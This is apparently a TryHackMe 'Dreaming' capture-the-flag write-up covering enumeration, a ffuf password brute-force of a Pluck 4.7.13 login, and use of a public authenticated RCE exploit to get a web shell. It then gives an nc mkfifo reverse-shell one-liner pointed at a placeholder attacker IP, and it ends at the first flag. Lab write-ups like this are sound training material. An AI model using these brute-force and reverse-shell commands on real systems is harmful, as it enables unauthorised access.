---
description: https://tryhackme.com/r/room/dreaming
---

# Tryhackme - Dreaming Writeup

<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

### Welcome to Walktrough of the Dreaming room.&#x20;

#### We will focus on applying Multiple techniques as Enumeration, Vulnerability Hunting as well as misconfigurations exploit.

{% hint style="info" %}
This writeup is done on a Kali Linux Virtual Machine with tools up to date at 19/12/2024
{% endhint %}

<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

### Here is our task.

* Finding `Lucien` flag
* Finding `Death` flag
* Finding `Morpheus` flag

### Starting Information context

* Only the IP is known and will be called \<IP> in this writeup
* Every flag has format \*\*\*{SOME\_TEXT}

## 1 - First Step - Enumeration

With our information, the first thing to do is Enumeration of the services running on the give IP

```bash
nmap <IP>
```

<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

We can then expand information of the services

```
nmap -A -p22,80 <IP>
```

<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

From this we can retrieve those informations

| Service Port | Service Name | Version             |
| ------------ | ------------ | ------------------- |
| 22           | ssh          | OpenSSH 8.2p1       |
| 80           | http         | Apache httpd 2.4.41 |

### Most Probable OS : Linux

## 2 - Web Analysis

Now that we know there is a http server, let's see if there is something interseting so let's connect to it in our browser.

<figure><img src=".gitbook/assets/image (5).png" alt="" width="375"><figcaption></figcaption></figure>

We are welcomed with a Ubuntu default page. Let's dig into the potential directories using `Gobuster`

```
gobuster dir -u "http://<IP> -w /usr/share/wordlists/dirb/common.txt
```

Here we use common.txt to start searching for common possible directories

<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

### Intersting directory: App

Let's go to this page in the browser

```
http://<IP>/app
```

<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

We have access to a directory listing of a `pluck-4.7.13` directory. Let's click on it.\
Our new URL is now

```
http://<IP>/app/pluck-4.7.13/?file=dreaming
```

<figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

What can try to see if something is hidden in source code but it doesn't look like it contains anything relevant.

#### Relevant info on the page: admin button on the bottom

<figure><img src=".gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

We can click on the `admin` button and we will be redirected to

```
http:/<IP>/app/pluck-4.7.13/login.php
```

<figure><img src=".gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

We no have a password field but we don't have password.

* One more time nothing hidden in the source code.

### At this point we have multiple choices

* Trying to guess the password
* Trying to brute-force the password
* Trying to find a vulnerability associated to the version of pluck found
* Searching the files of the webserver for potential clues

## 2.1 - Check for login page exploit

Let's try to see if there is any vulnerability that could be used directly unauthenticated or one that could give us the access to the correct password or login.

On the Terminal Let's search for exploits using `searchsploit`&#x20;

```sh
searchsploit pluck 4.7.13
```

<figure><img src=".gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

We do find an exploit, Unfortunatly it is a "Authenticated" exploit which means we will need to find the password another way. But let's keep in mind if we are able to log in we could potentially make use of Remote code execution.

## 2.2 - Brute-force login

Since there is no exploit, let's try to brute force the login. First step would be to gather a random test of invalid password. Let's enter a random value in the password field and watch the result of the request in the browser `inspector`. \
We will look at the network tab for the POST request checking the Request body in `RAW` Format.

Value Used for password: `test`

&#x20;

<figure><img src=".gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

### Important : We retrieved the body for making a brute-force POST attack on this page

```
cont1=test$bogus=&submit=Log+in
```

{% hint style="info" %}
Import to remember to use the correct Content-Type header when doing a Brute-force for POST request.


{% endhint %}

```
Content-Type: application/x-www-form-urlencoded
```

Now let's build our terminal command for brute-forcing the password. Let's use ffuf in POST mode with our header and data. We will set the FUZZ keyword at the value of test that we previously gathered\
Let's use a wordlist with only 1 value "test" to check for incorrect page size.

{% code overflow="wrap" %}
```sh
fffuf -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "cont1=FUZZ&bogus=&submit=Log+in" -w <WORDLIST> -u http://<IP>/app/pluck-4.7.13/login.php
```
{% endcode %}

Replace IP and Wordlist with your values

<figure><img src=".gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

We can see that Invalid password page size is `1289`&#x20;

Let's filter that with `-fs 1289` and see what it gives us. We will also switch to the rockyou wordlist located at `/usr/share/wordlists/rockyou.txt` .

{% code overflow="wrap" %}
```sh
ffuf -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "cont1=FUZZ&bogus=&submit=Log+in" -w /usr/share/wordlists/rockyou.txt  -u http://<IP>/app/pluck-4.7.13/login.php -fs 1289
```
{% endcode %}

Change the IP for yours.

<figure><img src=".gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

We find the password nearly instantly so I interrupted the search and now we found the correct password for our pluck login page.

### Important info: password

## 2.3 - Login in

Let's see what is on that page. We enter "password" in the login and get access to a new page.

<figure><img src=".gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

There we go, we have access to the dashboard.&#x20;

#### Now we have successfully authenticated. It means that any exploit that needed authentication can now potentially be used. Let's see if we can pop a reverse shell in this machine.

## 3- Exploiting Pluck

We Earlier found out that there was an exploit. Remember:

<figure><img src=".gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

Let's download it from exploit-db.com to our machine to see if we can use it.

{% embed url="https://www.exploit-db.com/exploits/49909" %}

<figure><img src=".gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

Let's go to our now downloaded file in the terminal and see what we can do with it. Its a python file so we can use (exploit file name will be 49909.py on download but you may change it if you want)

```
python3 <exploit_file_name>
```

It will fail because we need to provide it inputs as parameters in the terminal as it is indicated in the script:

<figure><img src=".gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

We can then use our parameters and the pluckcmspath which is the url path to pluck&#x20;

`/app/pluck-4.7.13`

```
python3 <exploit_file_name> <IP> 80 password /app/pluck-4.7.13
```

This is what we get back

<figure><img src=".gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

Let's access that page link and see what we got.

<figure><img src=".gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

We got a p0wny@shell. We can actually execute linux commands inside of it so let's do a quick reverse shell with reverse shell generator and conect to a terminal instead of that web shell.

{% embed url="https://www.revshells.com/" %}

I used the `nc mkfifo` rev shell

{% code overflow="wrap" %}
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ATTACKER_IP> <ATTACKER_PORT> >/tmp/f
```
{% endcode %}

Change the ip and port to your machine's one and before sending the line in the p0wny shell, setup  a netcat listener on your machine on the port you have chosen

```
nc -lvnp <ATTACKER_PORT>
```

<figure><img src=".gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

### We now have access to a reverse shell in the machine.

We can then run some commands to understand our context

* pwd
* whoami
* uname -a

<figure><img src=".gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

We are www-data we can then go to home directory and see if there is any users.

<figure><img src=".gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

### Important: Every of our users are inside this machine. We will need to dig to have access to every flag.

## FLAG 1 - Lucien

Let's try to focus on the first flag.

